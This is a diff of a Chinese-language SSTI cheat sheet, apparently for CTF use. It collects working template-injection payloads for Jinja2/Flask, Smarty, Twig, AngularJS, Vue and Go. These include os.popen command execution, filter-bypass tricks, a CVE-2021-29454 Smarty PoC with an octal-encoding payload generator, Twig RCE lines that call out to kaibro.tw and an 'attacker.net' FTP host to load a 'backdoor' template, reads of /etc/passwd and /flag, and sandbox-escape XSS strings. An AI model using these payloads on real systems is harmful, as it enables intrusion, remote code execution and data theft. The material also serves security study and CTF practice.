@@ -1,30 +1,76 @@
 # 引擎判断
 ![](attachments/Pasted%20image%2020240222134656.png)
+
+- `{{ 7*'7' }}`
+    - Twig: `49`
+    - Jinja2: `7777777`
+- `<%= 7*7 %>`
+    - Ruby ERB: `49`
 ## Python
-## 内部魔术方法
-| 方法                   | 描述                                                                                                                                                                                                            |
-| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `__class__`            | 返回对象所属的类                                                                                                                                                                                                |
-| `__init__`             | 类的初始化方法                                                                                                                                                                                                  |
-| `__bases__`/`__mro__`  | 返回盖类型的所有父类                                                                                                                                                                                            |
-| `__subclasses__`       | 返回继承该类的所有可用子类                                                                                                                                                                                      |
-| `__globals__`          | 返回当前位置所有可用的全部全局变量的字典引用                                                                                                                                                                    |
-| `__dict__`             | 包含类的静态函数、类函数、普通函数、全局变量以及一些内置属性的字典                                                                                                                                              |
+### 内部魔术方法
+| 方法                     | 描述                                                                                                                                |
+| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
+| `__class__`            | 返回对象所属的类                                                                                                                          |
+| `__init__`             | 类的初始化方法                                                                                                                           |
+| `__bases__`/`__mro__`  | 返回盖类型的所有父类                                                                                                                        |
+| `__subclasses__`       | 返回继承该类的所有可用子类                                                                                                                     |
+| `__globals__`          | 返回当前位置所有可用的全部全局变量的字典引用                                                                                                            |
+| `__dict__`             | 包含类的静态函数、类函数、普通函数、全局变量以及一些内置属性的字典                                                                                                 |
 | `__getattribute__()`   | 存在于实例、类和函数中的_`_getattribute__`魔术方法。实际上，当针对实例化的对象进行点操作（例如：a.xxx / a.xxx()）时，都会自动调用`__getattribute__`方法。因此，我们可以通过这个方法直接访问实例、类和函数的属性 |
-| `__getitem__()`        | 调用字典中的键值，实际上是调用此魔术方法。例如，`a['b']` 就是 `a.__getitem__('b')`                                                                                                                              |
-| `__builtins__`         | 内建名称空间，包含一些常用的内建函数                                                                                                                                                                            |
-| `__import__`           | 动态加载类和函数，也可用于导入模块。常用于导入os模块，例如`__import__('os').popen('ls').read()`                                                                                                                 |
-| `__str__()`            | 返回描述该对象的字符串，通常用于打印输出                                                                                                                                                                        |
-| `url_for`              | Flask框架中的一个方法，可用于获取`__builtins__`，且u`rl_for.__globals__['__builtins__']`包含current_app                                                                                                         |
-| `get_flashed_messages` | Flask框架中的一个方法，可用于获取`__builtins__`，且`get_flashed_messages.__globals__['__builtins__']`包含current_app                                                                                            |
-| `lipsum`               | Flask框架中的一个方法，可用于获取`__builtins__`，且`lipsum.__globals__`包含os模块（例如：`{{lipsum.__globals__['os'].popen('ls').read()}}`）                                                                    |
-| `current_app`          | 应用上下文的全局变量                                                                                                                                                                                            |
-| `request`              | 用于获取绕过字符串的参数                                                                                                                                                                                        |
-| `config`               | 当前应用的所有配置。还可以使用`{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`来执行操作系统命令                                                                                          |
-| `g`                       | 通过`{{ g }}`可以获取`<flask.g of 'flask_ssti'>`                                                                                                                                                                                                                |
+| `__getitem__()`        | 调用字典中的键值，实际上是调用此魔术方法。例如，`a['b']` 就是 `a.__getitem__('b')`                                                                          |
+| `__builtins__`         | 内建名称空间，包含一些常用的内建函数                                                                                                                |
+| `__import__`           | 动态加载类和函数，也可用于导入模块。常用于导入os模块，例如`__import__('os').popen('ls').read()`                                                               |
+| `__str__()`            | 返回描述该对象的字符串，通常用于打印输出                                                                                                              |
+| `url_for`              | Flask框架中的一个方法，可用于获取`__builtins__`，且u`rl_for.__globals__['__builtins__']`包含current_app                                             |
+| `get_flashed_messages` | Flask框架中的一个方法，可用于获取`__builtins__`，且`get_flashed_messages.__globals__['__builtins__']`包含current_app                                |
+| `lipsum`               | Flask框架中的一个方法，可用于获取`__builtins__`，且`lipsum.__globals__`包含os模块（例如：`{{lipsum.__globals__['os'].popen('ls').read()}}`）               |
+| `current_app`          | 应用上下文的全局变量                                                                                                                        |
+| `request`              | 用于获取绕过字符串的参数                                                                                                                      |
+| `config`               | 当前应用的所有配置。还可以使用`{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`来执行操作系统命令                                    |
+| `g`                    | 通过`{{ g }}`可以获取`<flask.g of 'flask_ssti'>`                                                                                        |
 ### Jinja2
+- 拿classes
+	-  `{{ ''.__class__.__mro__[2].__subclasses__() }}`
+### bypass
+##### 过滤中括号
+- `__getitem__`
+- `{{''.__class__.__mro__.__getitem__(2)}}`
+    - `{{''.__class__.__mro__[2]}}`
+##### 过滤`{{`和`}}`
+- `{%%}`
+- 执行结果外传
+##### 过滤`.`
+- `{{''.__class__}}`
+    - `{{''['__class__']}}`
+    - `{{''|attr('__class__')}}`
+##### Keyword过滤
+- `{{''.__class__}}`
+    - `{{''[request.args.kaibro]}}&kaibro=__class__`
+
+### 脚本
+拿index索引值
+```PYTHON
+def find():
+    list = ""
+    list = list.replace('\'','')
+    list = list.replace('<','')
+    list = list.replace('>','')
+    list = list.replace('class ','')
+    list = list.replace('enum ','')
+    list = list.replace('type ','')
+    list = list.replace(' ','')
+    list = list.split(',')
+    print(list)
+    className = 'subprocess.Popen' #需要查找的模块名称
+    print(list[127])
+    num = list.index(className)
+    print(num) #返回索引
 
 
+if __name__ == '__main__':
+    find()
+
+```
 ## PHP
 ### Smarty
 - **{$smarty.version}**  返回版本信息
@@ -72,6 +118,27 @@ Smarty template_object 沙箱逃逸 PHP 代码注入漏洞
 poc 
 ```text
 string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}
+```
+#### CVE-2021-29454
+POC
+```
+eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
+```
+
+生成脚本
+
+```PYTHON
+function = 'system'
+cmd = 'cat /flag'
+def StrToA(string):
+	result = ''
+	for ss in string:
+		c = str(oct(ord(ss)).replace('0o', '\\'))
+		result += c
+	result = "(\"" + result + "\")"
+	return result
+payload = "eval:{math equation='" + StrToA(function) + StrToA(cmd) + "'}"
+print(payload)
 ```
 
 ### Twig
@@ -160,6 +227,7 @@ array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array
 ```
 
 payload
+
 ```php
 {{["id"]|filter("system")}}
 {{["id"]|filter("passthru")}}
@@ -190,7 +258,61 @@ array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] ) : 
 {{[0, 0]|reduce("passthru", "id")}}
 {{[0, 0]|reduce("exec", "id")}} // 无回显
 ```
+
+### Code
+- RCE
+    - `{{['id']|map('passthru')}}`
+    - `{{['id']|filter('system')}}`
+    - `{{app.request.query.filter(0,'curl${IFS}kaibro.tw',1024,{'options':'system'})}}`
+    - `{{_self.env.setCache("ftp://attacker.net:21")}}{{_self.env.loadTemplate("backdoor")}}`
+    - `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+- Read file
+    - `{{'/etc/passwd'|file_excerpt(30)}}`
+- Version
+    - `{{constant('Twig\\Environment::VERSION')}}`
+
+## AngularJS
+- v1.6 後移除 Sandbox
+- Payload
+    - `{{ 7*7 }}` => 49
+    - `{{ this }}`
+    - `{{ this.toString() }}`
+    - `{{ constructor.toString() }}`
+    - `{{ constructor.constructor('alert(1)')() }}` 2.1 v1.0.1-v1.1.5
+    - `{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }}` 2.1 v1.0.1-v1.1.5
+    - `{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) }}` 2.3 v1.2.19-v1.2.23
+    - `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}` v1.2.24-v1.2.29
+    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}` v1.3.20
+    - `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` v1.4.0-v1.4.9
+    - `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}` v1.5.0-v1.5.8
+    - `{{ [].pop.constructor('alert(1)')() }}` 2.8 v1.6.0-1.6.6
+
+## Vue.js
+- `{{constructor.constructor('alert(1)')()}}`
+
+## Golang
+- module
+    - [html/template](https://pkg.go.dev/html/template)
+    - [text/template](https://pkg.go.dev/text/template)
+- Testing
+    - `{{87}}`
+    - `{{.}}`
+    - `{{"meow"|print}}`
+    - `{{"<script>alert(/xss/)</script>"}}`
+    - `{{ .MyFunc "arg1" "arg2" }}`
+        - 需上下文有定義 `MyFunc` 函數
+    - ...
+- [Echo](https://github.com/labstack/echo) gadget
+    - `{{.File "/etc/passwd"}}`
+    - `{{.Echo.Filesystem.Open "/etc/passwd"}}`
+    - `{{.Echo.Static "/meow" "/"}}`
+    - Example:
+        - [ACSC CTF 2023 - easyssti](https://blog.hamayanhamayan.com/entry/2023/02/26/124239#web-easySSTI)
+            - `{{ $x := .Echo.Filesystem.Open "/flag" }} {{ $x.Seek 1 0 }} {{ .Stream 200 "text/plain" $x }}` (by @nyancat)
+            - `{{ (.Echo.Filesystem.Open "/flag").Read (.Get "template") }} {{ .Get "template" }}` (by @maple3142)
+            - `{{ $f := .Echo.Filesystem.Open "/flag" }} {{ $buf := .Get "template" }} {{ $f.Read $buf }} {{ $buf }` (by @Ocean)
 # 参考文章
+
 [一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/2130787)
 [【网络安全 | 1.5w字总结】SSTI漏洞入门，这一篇就够了。-CSDN博客](https://blog.csdn.net/2301_77485708/article/details/132467976)
 [以Twig模板为例浅学一手SSTI - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/314028.html)
